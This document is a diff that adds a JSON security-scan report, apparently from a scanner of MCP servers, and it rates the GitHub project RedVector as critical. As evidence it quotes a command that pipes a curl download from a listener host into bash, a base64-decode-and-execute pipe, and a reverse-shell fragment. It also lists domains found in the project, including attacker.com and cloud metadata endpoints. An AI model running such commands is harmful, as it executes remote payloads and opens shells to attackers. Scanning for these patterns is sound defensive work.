@@ -1,0 +1,80 @@
+{
+  "item": {
+    "source": "github:mcp-server",
+    "ecosystem": "GitHub",
+    "name": "0x7AK7/RedVector",
+    "version": "272dd5c7d70b8c706e4a943391d640b291cf32b2",
+    "download": "https://codeload.github.com/0x7AK7/RedVector/tar.gz/272dd5c7d70b8c706e4a943391d640b291cf32b2"
+  },
+  "archive_sha256": "0a6394a57fc0588742848db2485fb7e78ef47da594333ec963157c4a537bd706",
+  "findings": [
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "RedVector-272dd5c7d70b8c706e4a943391d640b291cf32b2/redvector_server.py",
+      "line": 23090,
+      "evidence": "curl -s http://{lhost}:{http_port}/payload | bash",
+      "file_sha256": "83839898cdff5909384c9e6e1b4c37c6da642f52647d089c4eb03651ee3e1efe"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0103",
+      "summary": "Decodes a base64 payload and executes it",
+      "path": "RedVector-272dd5c7d70b8c706e4a943391d640b291cf32b2/redvector_server.py",
+      "line": 19058,
+      "evidence": "base64 -d | bash",
+      "file_sha256": "83839898cdff5909384c9e6e1b4c37c6da642f52647d089c4eb03651ee3e1efe"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0104",
+      "summary": "Reverse shell one-liner",
+      "path": "RedVector-272dd5c7d70b8c706e4a943391d640b291cf32b2/redvector_server.py",
+      "line": 19027,
+      "evidence": "bash -i >& /dev/tcp/",
+      "file_sha256": "83839898cdff5909384c9e6e1b4c37c6da642f52647d089c4eb03651ee3e1efe"
+    }
+  ],
+  "flags": [],
+  "domains": [
+    "0x7ak7.github.io",
+    "1.2.3.4",
+    "127.0.0.1",
+    "169.254.169.254",
+    "169.254.170.2",
+    "192.0.2.15",
+    "224.0.0.1",
+    "5.6.7.8",
+    "9.10.11.12",
+    "api.github.com",
+    "attacker.com",
+    "attacker.xss.ht",
+    "burpcollaborator.net",
+    "cve.org",
+    "downloads.claude.ai",
+    "example.com",
+    "example.invalid",
+    "free-proxy-list.net",
+    "github.com",
+    "httpbin.org",
+    "img.shields.io",
+    "kubernetes.default.svc",
+    "metadata.google.internal",
+    "name.invalid",
+    "nmap.org",
+    "nvd.nist.gov",
+    "open.hikvision.com",
+    "raw.githubusercontent.com",
+    "services.nvd.nist.gov",
+    "target.com",
+    "untrusted.invalid",
+    "www.easy4ip.com",
+    "www.onvif.org",
+    "www.python.org",
+    "www.socks-proxy.net",
+    "www.sslproxies.org"
+  ],
+  "install_script": false,
+  "score": "critical"
+}
